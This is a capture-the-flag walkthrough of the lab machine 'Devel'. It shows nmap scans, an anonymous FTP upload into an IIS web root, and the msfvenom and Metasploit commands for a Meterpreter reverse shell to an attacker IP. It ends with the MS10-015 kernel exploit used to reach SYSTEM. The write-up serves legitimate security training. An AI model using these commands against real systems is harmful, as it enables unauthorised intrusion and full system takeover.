Devel, while relatively simple, demonstrates the security risks associated with some default program configurations. It is a beginner-level machine which can be completed using publicly available exploits.

## Walkthrough

### Reconnaissance

We will start by **scanning protocolos** in the target machine, this can be divided in 3 phases:
1. Scan for **open ports**.
2. Scan for **services** in these open ports.
3. Scan for **vulnerabilities** in these services.

<br />
Let's start by scanning for **open ports**:

```bash
sudo nmap -sS 10.10.10.5 -p- -T4 --min-rate 5000 -oN all_tcp_ports.txt --open -n -Pn -vv
sudo nmap -sU 10.10.10.5 -p- -T4 --min-rate 5000 -oN all_udp_ports.txt --open -n -Pn -vv
```

![](/assets/Devel/1.png)

<br />
<br />
<br />

There are **2 open ports**:
+ **21/tcp**
+ **80/tcp**

<br />

Let's check which **services** are running in these ports:

```bash
sudo nmap -sS 10.10.10.5 -p 21,80 -T4 --min-rate 5000 -oX open_tcp_ports.xml -oN open_tcp_ports.txt --version-all -n -Pn -A
```

![](/assets/Devel/2.png)

<br />
<br />
<br />

We can see that the services correspond to:
+ **21/tcp Microsoft ftpd**
+ **80/tcp Microsoft IIS httpd 7.5**

<br />

Now we will seek for **vulnerabilities**:

```bash
sudo nmap -sS 10.10.10.5 -p 21,80 -T4 --min-rate 5000 --script="vuln or intrusive or discovery" -oN tcp_vulns.txt -oX tcp_vulns.xml -n -Pn
```
<br />

This scan didn't return any relevant information.

<br />

<br />
### Foothold

This machine is quite easy, we only have to perform some good enumeration and think logically. **FTP will be our best friend** in this machine.

<br />

The first thing that we will notice when checking the performed enumeration is that **FTP allows anonymous login**. We can connect to it by running `ftp anonymous@10.10.10.5` and **providing no password** when asked to. There is no relevant information in these server, however, we can see some files related to IIS, which is found in the web server:

<br />

![](/assets/Devel/3.png)

<br />
<br />
<br />

With this information, we can assume that this directory contains the **files that the web server is representing**, so we can try uploading a test file to see if it works:

![](/assets/Devel/4.png)

<br />

![](/assets/Devel/5.png)

<br />
<br />
<br />

We can now try to see if this **file is accessible from the web server**:

```bash
curl http://10.10.10.5/test.aspx
```

![](/assets/Devel/6.png)

<br />
<br />
<br />

Great, it did work, now we only have to **upload a reverse shell** to gain access to this machine, let's create the **reverse shell**, we just have to **visit the site for the reverse shell to work**:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.9 LPORT=4444 --platform windows -f aspx -o revshell.aspx
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.10.16.9; set LPORT 4444; run"
curl http://10.10.10.5/revshell.aspx #In another tab
```

<br />

![](/assets/Devel/8.png)

<br />
<br />
<br />

Great, we have obtained a reverse shell as a non-privileged user, however we **can not access the flags yet**.

<br />

<br />

### Privilege Escalation

From here, we can start enumerating the machine to see how we can escalate privileges.

<br />

We have some **sensitive privileges** (*SeImpersonatePrivilege* and *SeAssignPrimaryTokenPrivilege*), however I tried using some types of Potatoes but it didn't work.

<br />
<br />
<br />

We can use the **exploit suggester** to see if there is any kernel exploit that we can leverage, so let's **background the Metasploit session** and run it, we will find :

```bash
use post/multi/recon/local_exploit_suggester
set session 1
run
```

![](/assets/Devel/10.png)

<br />
<br />
<br />

We can start trying these exploits one by one, until we end up trying the **MS10-015**, which works:

```bash
use exploit/windows/local/ms10_015_kitrap0d
set session 1
set lhost tun0
run
```

![](/assets/Devel/11.png)

<br />
<br />
<br />

Great, we have **NT AUTHORITY\SYSTEM privileges**, let's print the flags to finish the machine:

```cmd
shell
type C:\Users\babis\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
```
